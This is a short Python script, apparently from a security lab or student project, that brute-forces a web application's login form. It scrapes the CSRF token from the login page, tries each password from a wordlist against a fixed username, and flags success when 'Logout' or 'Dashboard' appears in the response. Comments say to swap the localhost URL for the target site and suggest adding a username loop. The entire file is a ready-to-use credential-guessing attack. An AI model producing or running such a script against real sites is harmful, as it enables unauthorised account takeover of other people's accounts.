#As the name stated this is the script used for brute force attack for the web applciations
import requests
from bs4 import BeautifulSoup

# Set up the URLs and user details
url = "http://127.0.0.1:5000" #localhosted website, replace with the url the website is hosting
login_url = f"{url}/login"
#assume you already know the user name.
#you can also use the script to brute force the username but will need another loop for it beside the password loop
username = "Test01user"

# Step 1: Start a session and retrieve the CSRF token from the login page
session = requests.Session()
response = session.get(login_url)
soup = BeautifulSoup(response.text, 'html.parser')

# Find the CSRF token in the form's hidden fields, this is tolorate to the website.
csrf_token = soup.find('input', {'name': 'csrf_token'})['value']

# Step 2: Attempt login with each password from the password_list.txt 
# If you want you can modify it by hardcode the list here instead
with open("password_list.txt", "r") as file:
    passwords = file.readlines()

for password in passwords:
    password = password.strip()  # Remove any extra whitespace/newlines

    # Prepare login data for the POST request
    login_data = {
        "username": username,
        "password": password,
        "csrf_token": csrf_token
    }

    # Send the login request
    response = session.post(login_url, data=login_data)
    print(f"Tried password: {password}, Status code: {response.status_code}")

    # Check for success indicators (like "Dashboard" or "Logout" in the response text)
    if "Logout" in response.text or "Dashboard" in response.text:
        print(f"Login successful! Username: {username}, Password: {password}")
        break
else:
    # Handle case where password is no match in password_list.txt
    print("Password not found in the list.")
